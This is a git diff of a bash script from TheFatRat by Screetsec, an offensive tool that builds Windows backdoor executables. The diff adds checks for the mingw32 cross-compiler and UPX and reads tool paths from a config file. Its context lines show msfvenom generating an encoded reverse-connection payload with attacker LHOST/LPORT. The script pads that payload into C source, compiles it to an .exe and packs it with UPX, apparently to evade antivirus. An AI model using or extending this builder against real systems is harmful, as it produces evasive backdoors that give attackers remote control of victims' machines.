@@ -1,5 +1,51 @@
 #!/bin/bash
+file="config.path"
+if [ -f "$file" ]
+then
+msfconsole=`sed -n 5p config.path`	
+msfvenom=`sed -n 6p config.path`
+backdoor=`sed -n 7p config.path`
+searchsploit=`sed -n 8p config.path`
+else
+	echo "Configuration file does not exists , run setup.sh first ."
+exit 1
+fi
 
+# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
+# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
+# check mingw if exists
+      which i586-mingw32msvc-gcc > /dev/null 2>&1
+      if [ "$?" -eq "0" ]; then
+      echo [✔]::[mingw32]: installation found!;
+      COMPILER="i586-mingw32msvc-gcc"
+else
+      which i686-w64-mingw32-gcc > /dev/null 2>&1
+      if [ $? -eq 0 ]; then
+      echo [✔]::[mingw32]: installation found!;
+      COMPILER="i686-w64-mingw32-gcc"
+else
+   echo [x]::[warning]:this script require mingw32 installed to work ;
+   echo ""
+   echo [!]::Run setup.sh to install mingw32 ;
+   sleep 2s
+   exit 1
+ fi
+fi
+
+# check upx if exists
+      which upx > /dev/null 2>&1
+      if [ $? -eq 0 ]; then
+      echo [✔]::[Upx]: installation found!;
+
+else
+
+   echo [x]::[warning]:this script require upx to work ;
+   echo ""
+   echo [!]::Run setup.sh to install upx ;
+   echo ""
+   sleep 2s
+   exit 1
+fi
 
 ###################################################################################################
 # FatRat Coded By Screetsec ( Edo Maland )
@@ -140,26 +186,7 @@ if [[ -f "$outputExe" ]]; then
 	echo ""
 fi
 
-# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
-# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
-# check mingw if exists
-      which i586-mingw32msvc-gcc > /dev/null 2>&1
-      if [ "$?" -eq "0" ]; then
-      echo [✔]::[mingw32]: installation found!;
-      COMPILER="i586-mingw32msvc-gcc"
-else
-      which i686-w64-mingw32-gcc > /dev/null 2>&1
-      if [ $? -eq 0 ]; then
-      echo [✔]::[mingw32]: installation found!;
-      COMPILER="i686-w64-mingw32-gcc"
-else
-   echo [x]::[warning]:this script require mingw32 installed to work ;
-   echo ""
-   echo [!]::[please wait]: please run setup.sh .... ;
-   sleep 2
-   exit
- fi
-fi
+
 sleep 2
 
 
@@ -186,7 +213,7 @@ while [[ ! -f "$outputExe" ]]; do
     generatePadding
   
     echo "" >> $cProg
-    msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
+    $msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
 
     generatePadding
 
@@ -210,5 +237,3 @@ done
 
 # Use UPX to create a second executable, testing...
 upx -q --ultra-brute -o $outputUPX $outputExe
-
-
